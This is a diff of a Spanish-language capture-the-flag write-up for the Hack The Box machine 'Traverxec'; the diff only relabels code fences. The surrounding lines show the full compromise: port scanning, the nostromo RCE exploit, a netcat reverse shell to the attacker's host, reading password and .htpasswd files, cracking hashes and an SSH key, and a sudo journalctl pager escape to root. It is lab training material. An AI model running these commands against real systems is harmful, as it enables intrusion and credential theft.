@@ -36,7 +36,7 @@ Iniciamos por ejecutar un `masscan` para descubrir puertos udp y tcp abiertos, y
 
 ## masscan
 
-```
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.165 | tee /home/tony/htb/traverxec/masscan.log
 
 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-21 03:49:45 GMT
@@ -53,7 +53,7 @@ Discovered open port 80/tcp on 10.10.10.165
 
 ## nmap services
 
-```
+``` text
 root@laptop:~# nmap -sS -sV -sC -p 22,80 -n --open -v 10.10.10.165 -oN /home/tony/htb/traverxec/services.nmap
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-20 21:56 CST
 NSE: Loaded 151 scripts for scanning.
@@ -128,7 +128,7 @@ Tal como hubiera sucedido con apache, nginx y otros populares servidores web, bu
 
 ## searchsploit
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ searchsploit nostromo
 -------------------------------------------------------------------- -----------------------------------
  Exploit Title                                                      |  Path
@@ -142,7 +142,7 @@ Shellcodes: No Result
 
 Copiamos con la opción `-m path` el exploit asociado a la versión que tenemos (**1.9.6**):
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ searchsploit -m exploits/multiple/remote/47837.py
   Exploit: nostromo 1.9.6 - Remote Code Execution
       URL: https://www.exploit-db.com/exploits/47837
@@ -154,7 +154,7 @@ Copied to: /home/tony/htb/traverxec/47837.py
 
 Veamos el contenido:
 
-```python
+``` python
 # Exploit Title: nostromo 1.9.6 - Remote Code Execution
 # Date: 2019-12-31
 # Exploit Author: Kr0ff
@@ -235,7 +235,7 @@ Nota: No olviden modificar el exploit para poder ejecutarlo correctamente, ya qu
 
 Empeze primero por probar manualmente el exploit de la siguiente manera con `ncat` y `echo`:
 
-```bash
+``` bash
 tony@laptop:~/htb/traverxec$ echo -e $"POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\nHost: 10.10.10.165Content-Length: 1\r\n\r\necho\necho\nid 2&>1\n" | ncat -vn 10.10.10.165 80
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Connected to 10.10.10.165:80.
@@ -254,7 +254,7 @@ Ahora que podemos ejecutar remotamente instrucciones (RCE), podemos buscar como 
 
 En mi caso inicie con lo mas sencillo, buscar si tenemos `netcat` y que versión/sabor de `netcat` tenemos:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ echo -e $"POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\nHost: 10.10.10.165Content-Length: 1\r\n\r\necho\necho\nwhereis nc 2&>1\n" | ncat -vn 10.10.10.165 80
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Connected to 10.10.10.165:80.
@@ -275,7 +275,7 @@ Para nuestra fortuna tenemos netcat traditional. Esta es la que acepta el conect
 
 Ahora que hemos probado lo que requerimos, volver al exploit para mostrar su uso:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ ./47837.py 10.10.10.165 80 "nc -e /bin/bash 10.10.14.2 3001"
 
 
@@ -307,7 +307,7 @@ El comando nc o `netcat` recibe los argumentos:
 
 Ahora, antes de ejecutar el comando, preparamos nuestro listener:
 
-```
+``` text
 tony@laptop:~$ ncat -vnlp 3001
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -329,7 +329,7 @@ Como podemos ver, he lanzado el comando `id` que nos ha devuelto la salida del u
 
 Como podemos ver tenemos una conexión reversa un poco limitada, así que comencemos por hacer un mejora a una TTY interactiva:
 
-```
+``` text
 python --version
 python3 --version
 Python 3.7.3
@@ -342,7 +342,7 @@ www-data@traverxec:/usr/bin$
 
 Veamos el contenido de `/etc/passwd`:
 
-```
+``` text
 www-data@traverxec:/usr/bin$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -379,7 +379,7 @@ Exploremos la configuración del servicio de nostromo (`/usr/local/sbin/nhttpd`)
 
 Nota: `ps -fea | grep www-data` nos indica los procesos que ejecuta el usuario www-data, ahí veremos que aparte de nuestra reverse shell y la mejora a interactive tty, el proceso nhttpd aka nostromo.
 
-```
+``` text
 www-data@traverxec:/usr/bin$ find / -iname nostromo 2>/dev/null
 find / -iname nostromo 2>/dev/null
 /var/nostromo
@@ -517,7 +517,7 @@ www-data@traverxec:/usr/bin$
 
 Resaltan los archivos de configuración `/var/nostromo/conf/nhttpd.conf` y `/var/nostromo/conf/.htpasswd`
 
-```
+``` text
 www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
 cat /var/nostromo/conf/nhttpd.conf
 # MAIN [MANDATORY]
@@ -555,7 +555,7 @@ homedirs_public         public_www
 
 En este archivo no tenemos nada realmente interesante, pero veamos el siguiente:
 
-```
+``` text
 www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/.htpasswd
 cat /var/nostromo/conf/.htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
@@ -567,7 +567,7 @@ Uy, un hash.
 
 Comencemos por identificar el hash de acuerdo a su formato:
 
-```
+``` text
 tony@laptop:~$ hashcat --example-hashes | grep '$1' -m2 -A 2 -B 2
 
 MODE: 500
@@ -580,7 +580,7 @@ Nostromo parece utilizar el formato md5crypt para almacenar las contraseñas de 
 
 Ataquemos por fuerza bruta el hash de david con el diccionario de **rockyou.txt**:
 
-```
+``` text
 tony@laptop:~$ ~/tools/hashcat-5.1.0/hashcat64.bin -m500 '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' ~/wl/rockyou.txt2 --quiet
 clGetDeviceIDs(): CL_DEVICE_NOT_FOUND
 
@@ -597,7 +597,7 @@ Cool. Ahora tenemos las credenciales de david.
 
 Nos conectamos por SSH como david:
 
-```
+``` text
 tony@laptop:~$ ssh david@10.10.10.165
 The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
 ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
@@ -617,7 +617,7 @@ Ok, o tal vez no. Parece que la contraseña de "david" no es para el usuario.
 
 Continuemos ahora explorando el home de david:
 
-```
+``` text
 www-data@traverxec:/usr/bin$ ls /home
 ls /home
 david
@@ -628,7 +628,7 @@ ls: cannot open directory '/home/david': Permission denied
 
 Como podemos ver, no tenemos acceso al directorio home de david, pero aquí es donde volviendo a las notas previas nos damos cuenta del siguiente detalle en el archivo de configuración de nostromo:
 
-```
+``` text
 # HOMEDIRS [OPTIONAL]
 
 homedirs                /home
@@ -637,7 +637,7 @@ homedirs_public         public_www
 
 Ahora con este conocimiento, y tras leer el manual de configuración, tratemos de listar el directorio:
 
-```
+``` text
 www-data@traverxec:/usr/bin$ ls -la /home/david/public_www/
 ls -la /home/david/public_www/
 total 16
@@ -695,7 +695,7 @@ e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
 
 Copiamos y pegamos dentro de un archivo local. Acto seguido, descomprimamos el archivo:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ vim backup-ssh-identity-files.tgz.b64
 tony@laptop:~/htb/traverxec$ base64 -d backup-ssh-identity-files.tgz.b64 > backup-ssh-identity-files.tgz
 tony@laptop:~/htb/traverxec$ file backup-ssh-identity-files.tgz
@@ -721,7 +721,7 @@ Como podemos ver, no pudimos establecer la conexión debido a que necesitamos cr
 
 JohnTheRipper tiene un script en python para obtener el hash correspondiente a la protección de contraseña que se da en RSA. Ejecutamos este script contra el backup y obtenemos el siguiente hash:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa
 home/david/.ssh/id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
 tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa > sshkey.hash
@@ -729,7 +729,7 @@ tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh
 
 Ahora ejecutamos `JTR` contra este hash utilizando como diccionario **rockyou.txt**:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/john sshkey.hash --wordlist=/home/tony/wl/rockyou.txt2
 Note: This format may emit false positives, so it will keep trying even after finding a
 possible candidate.
@@ -754,7 +754,7 @@ Como resultado, encontramos que la protección es _hunter_.
 
 Ahora si, nos conectamos como david utilizando la llave:
 
-```
+``` text
 tony@laptop:~/htb/traverxec$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
 Enter passphrase for key 'home/david/.ssh/id_rsa':
 Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
@@ -766,7 +766,7 @@ Perfecto, ahora que hemos entrado como david, observaremos que en el home se enc
 
 # user.txt
 
-```
+``` text
 david@traverxec:~$ cat user.txt
 <miau>
 ```
@@ -779,7 +779,7 @@ Ahora que somos david, tratemos de subir desde este usuario a root.
 
 Lo primero que nos llama la atención es la existencia de la carpeta bin, asi que listemos su contenido:
 
-```
+``` text
 david@traverxec:~$ ls bin
 server-stats.head  server-stats.sh
 david@traverxec:~$ cat bin/server-stats.head
@@ -809,7 +809,7 @@ echo "Last 5 journal log lines:"
 
 Esta ultima linea resulta sumamente interesante, ya que nos indica la existencia de que podemos ejecutar journalctl como root. Probemos para verificar de los dos modos. Primero tratemos de obtener los comandos validos vía sudo para david:
 
-```
+``` text
 david@traverxec:~$ sudo -l
 [sudo] password for david:
 Sorry, try again.
@@ -822,7 +822,7 @@ david@traverxec:~$
 
 Sorpresa, no tenemos la contraseña de david. Ahora tratemos de ejecutar el comando tal cual aparece en el script:
 
-```
+``` text
 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Fri 2020-03-20 23:50:48 EDT, end at Sat 2020-03-21 00:58:16 EDT. --
 Mar 20 23:50:52 traverxec nhttpd[442]: started
@@ -834,7 +834,7 @@ Mar 21 00:38:41 traverxec su[819]: FAILED SU (to david) www-data on none
 
 El comando se ejecuta sin problemas. Probemos ahora cambiar un parámetro para aumentar el numero de lineas listadas por journalctl:
 
-```
+``` text
 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n10 -unostromo.service
 [sudo] password for david:
 ^Csudo: 1 incorrect password attempt
@@ -846,7 +846,7 @@ Ahora, si revisamos [https://gtfobins.github.io/gtfobins/journalctl/#sudo](https
 
 Para hacer el trigger de este evento, la manera fácil, consiste en reducir el tamaño de la ventana donde estamos trabajando a 5 o menos lineas, y ejecutar el comando con sudo. De esta manera al leerse la capacidad de la shell desde donde se ejecuta, el pager entregara la salida por `paginas`. Como `-n5` se refiere a solo desplegar 5 lineas, ajustamos este tamaño para forzar el pager.
 
-```
+``` text
 david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Fri 2020-03-20 23:50:48 EDT, end at Sat 2020-03-21 01:06:49 EDT. --
 Mar 20 23:50:52 traverxec nhttpd[442]: started
@@ -862,7 +862,7 @@ Ya que escapemos del pager como root via `!/bin/bash`, podemos hacer el resize d
 
 Ahora solo realizamos un cat de la flag, y acabamos con esta maquina.
 
-```
+``` text
 root@traverxec:/home/david# cat /root/root.txt
 <miau>
 ```
